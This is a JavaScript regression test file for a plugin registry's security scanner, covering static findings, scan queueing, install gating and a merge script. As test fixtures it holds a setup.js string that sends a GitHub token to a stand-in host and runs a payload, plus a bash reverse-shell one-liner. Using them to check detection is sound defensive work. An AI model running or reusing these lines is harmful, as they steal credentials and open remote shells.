/** Regression tests for security queueing, static findings and audit convergence. */

import assert from 'node:assert/strict'
import { execFile } from 'node:child_process'
import { mkdir, mkdtemp, readFile, rm, writeFile } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import path from 'node:path'
import { promisify } from 'node:util'
import { fileURLToPath } from 'node:url'
import {
  analyzePluginFiles,
  applySecurityGate,
  planSecurityScan,
  SECURITY_REASON_PENDING,
  securityGateReason,
  validSecurityResult,
} from './security-core.mjs'
import { assessGuidedInstall, promoteExactNpm } from './guided-audit-core.mjs'

const harmless = analyzePluginFiles([
  { path: 'lib/index.js', bytes: Buffer.from('export async function load(url) { return await fetch(url) }') },
], { scripts: {} })
assert.equal(harmless.status, 'passed')
assert.equal(harmless.findings.length, 0)

const suspicious = analyzePluginFiles([
  {
    path: 'setup.js',
    bytes: Buffer.from("const { exec } = require('child_process'); fetch('https://example.test/' + process.env.GITHUB_TOKEN); exec('node payload.js')"),
  },
], { scripts: { postinstall: 'node setup.js' } })
assert.equal(suspicious.status, 'review')
assert.ok(suspicious.findings.some(row => row.rule === 'credential-access-with-network'))
assert.ok(suspicious.findings.some(row => row.rule === 'download-and-execute-primitives'))
assert.ok(suspicious.findings.some(row => row.rule === 'install-lifecycle-script'))

const critical = analyzePluginFiles([
  { path: 'payload.sh', bytes: Buffer.from('bash -i >& /dev/tcp/198.51.100.1/4444 0>&1') },
])
assert.equal(critical.status, 'review')
assert.equal(critical.riskScore, 100)

const registry = {
  plugins: [
    plugin('owner/stale', 'b', '2026-08-15T00:00:00Z'),
    plugin('owner/new', 'c', '2026-08-17T00:00:00Z'),
    plugin('owner/retry', 'd', '2026-08-15T00:00:00Z'),
    plugin('owner/backfill', 'e', '2026-08-15T00:00:00Z'),
    plugin('owner/done', 'f', '2026-08-15T00:00:00Z'),
  ],
}
const report = securityReport([
  result('owner/stale', 'a', 'passed'),
  result('owner/retry', 'd', 'error'),
  result('owner/done', 'f', 'passed'),
])
const plan = planSecurityScan(registry, report, 3, 2)
assert.deepEqual(plan.selected.map(row => row.repository), ['owner/stale', 'owner/new', 'owner/retry'])
assert.equal(plan.batches.length, 2)
assert.equal(plan.remaining, 1)
assert.equal(securityGateReason(registry.plugins[1], report), SECURITY_REASON_PENDING)
assert.equal(securityGateReason(registry.plugins[3], report), null, 'pre-enforcement plugins remain visible during backfill')

const stateRow = {
  plugin: {
    ...registry.plugins[1],
    install: { mode: 'automatic', source: 'github', spec: 'github:owner/new#' + 'c'.repeat(40), profiles: ['web'], requiresBuildApproval: false, manualSteps: false },
  },
  inspection: { reviewReasons: [], resolvedReasons: [] },
}
const gated = applySecurityGate(stateRow, report)
assert.equal(gated.plugin.install.mode, 'guided')
assert.equal(gated.plugin.install.manualSteps, true)
assert.deepEqual(gated.inspection.reviewReasons, [SECURITY_REASON_PENDING])

const auditPlugin = {
  packageName: 'test-plugin',
  install: { profiles: ['web'], requiresBuildApproval: false, manualSteps: false },
}
const npmProof = { verified: true, reason: 'exact-npm-tarball-verified', spec: 'test-plugin@1.0.0' }
assert.equal(
  assessGuidedInstall(auditPlugin, { reviewReasons: [], lifecycleScripts: [], runtimeArtifactsCommitted: true }, [], npmProof).outcome,
  'automatic-npm-candidate',
)
assert.equal(
  assessGuidedInstall(auditPlugin, { reviewReasons: [SECURITY_REASON_PENDING], lifecycleScripts: [], runtimeArtifactsCommitted: true }, [], npmProof).outcome,
  'guided-security-review',
)
assert.equal(
  assessGuidedInstall({ ...auditPlugin, install: { ...auditPlugin.install, manualSteps: true } }, {
    reviewReasons: ['author-requires-manual-configuration'], lifecycleScripts: [], runtimeArtifactsCommitted: true,
  }, [{ source: 'github' }], { verified: false, reason: 'npm-version-not-published' }).outcome,
  'guided-conflicting-evidence',
)

const promoted = promoteExactNpm(
  { ...auditPlugin, install: { ...auditPlugin.install, mode: 'guided', source: 'github', spec: 'github:owner/repo#' + 'a'.repeat(40) } },
  { inspection: { reviewReasons: [], resolvedReasons: [], profiles: ['web'] } },
  npmProof,
)
assert.equal(promoted.plugin.install.mode, 'automatic')
assert.equal(promoted.plugin.install.source, 'npm')
assert.equal(promoted.plugin.install.spec, 'test-plugin@1.0.0')
assert.equal(promoted.plugin.install.manualSteps, false)

assert.equal(validSecurityResult(result('owner/done', 'f', 'passed')), true)
await mergeIntegrationTest()
console.log('Plugin security policy tests passed')

function plugin(fullName, commit, verifiedAt) {
  return {
    fullName,
    verifiedCommit: commit.repeat(40),
    verifiedAt,
    packageName: fullName.split('/')[1],
    version: '1.0.0',
  }
}

function securityReport(results) {
  return {
    schemaVersion: 1,
    policyVersion: 1,
    generatedAt: '2026-08-16T00:00:00Z',
    enforcementStartedAt: '2026-08-16T00:00:00Z',
    results,
  }
}

function result(repository, commit, status) {
  return {
    repository,
    verifiedCommit: commit.repeat(40),
    packageName: repository.split('/')[1],
    version: '1.0.0',
    scannedAt: '2026-08-16T00:00:00Z',
    status,
    riskScore: 0,
    static: { scannedFiles: 1, scannedBytes: 1, findings: [] },
    sandbox: { status: 'passed', reason: 'test' },
  }
}

async function mergeIntegrationTest() {
  const execute = promisify(execFile)
  const scriptRoot = path.resolve(fileURLToPath(new URL('..', import.meta.url)))
  const temporary = await mkdtemp(path.join(tmpdir(), 'dsh-security-merge-test-'))
  try {
    const scans = path.join(temporary, 'scans')
    await mkdir(scans)
    const exactPlugin = {
      ...plugin('owner/new-plugin', 'a', '2026-08-17T00:00:00Z'),
      install: {
        mode: 'automatic', source: 'github', spec: 'github:owner/new-plugin#' + 'a'.repeat(40),
        profiles: ['web'], requiresBuildApproval: false, requiresRestart: true, manualSteps: false,
      },
    }
    const inspection = {
      classifierVersion: 11,
      profiles: ['web'],
      profileSource: 'client',
      lifecycleScripts: [],
      runtimeArtifactsCommitted: true,
      artifactGroups: [{ label: 'host', paths: ['index.js'], found: 'index.js' }],
      readme: { found: true, verifiedGitHubRepositories: ['owner/new-plugin'], unverifiedGitHubRepositories: [] },
      reviewReasons: [],
      resolvedReasons: [],
    }
    await json(path.join(temporary, 'registry.json'), { schemaVersion: 2, generatedAt: '2026-08-17T00:00:00Z', plugins: [exactPlugin] })
    await json(path.join(temporary, 'state.json'), {
      schemaVersion: 2,
      generatedAt: '2026-08-17T00:00:00Z',
      repositories: {
        'owner/new-plugin': { repository: 'owner/new-plugin', status: 'verified', checkedAt: '2026-08-17T00:00:00Z', plugin: exactPlugin, inspection },
      },
    })
    await json(path.join(temporary, 'review.json'), { schemaVersion: 1, generatedAt: '2026-08-17T00:00:00Z', repositories: [] })
    await json(path.join(temporary, 'report.json'), {
      schemaVersion: 1,
      policyVersion: 1,
      generatedAt: '2026-08-16T00:00:00Z',
      enforcementStartedAt: '2026-08-16T00:00:00Z',
      total: 0,
      summary: { passed: 0, review: 0, error: 0, pending: 1 },
      results: [],
    })
    await json(path.join(temporary, 'plan.json'), {
      schemaVersion: 1,
      generatedAt: '2026-08-17T00:00:00Z',
      selected: [{ repository: exactPlugin.fullName, verifiedCommit: exactPlugin.verifiedCommit }],
      remaining: 0,
    })
    await json(path.join(scans, 'result.json'), {
      schemaVersion: 1,
      policyVersion: 1,
      results: [result(exactPlugin.fullName, 'a', 'review')],
    })
    await execute(process.execPath, [
      path.join(scriptRoot, 'scripts', 'security-merge.mjs'),
      '--plan', path.join(temporary, 'plan.json'),
      '--results', scans,
      '--registry', path.join(temporary, 'registry.json'),
      '--state', path.join(temporary, 'state.json'),
      '--install-review', path.join(temporary, 'review.json'),
      '--report', path.join(temporary, 'report.json'),
    ], { windowsHide: true })
    const mergedRegistry = JSON.parse(await readFile(path.join(temporary, 'registry.json'), 'utf8'))
    const mergedReport = JSON.parse(await readFile(path.join(temporary, 'report.json'), 'utf8'))
    assert.equal(mergedRegistry.plugins[0].install.mode, 'guided')
    assert.equal(mergedRegistry.plugins[0].install.manualSteps, true)
    assert.equal(mergedReport.summary.review, 1)
    assert.equal(mergedReport.summary.pending, 0)
  } finally {
    await rm(temporary, { recursive: true, force: true })
  }
}

async function json(file, value) {
  await writeFile(file, JSON.stringify(value, null, 2) + '\n', 'utf8')
}
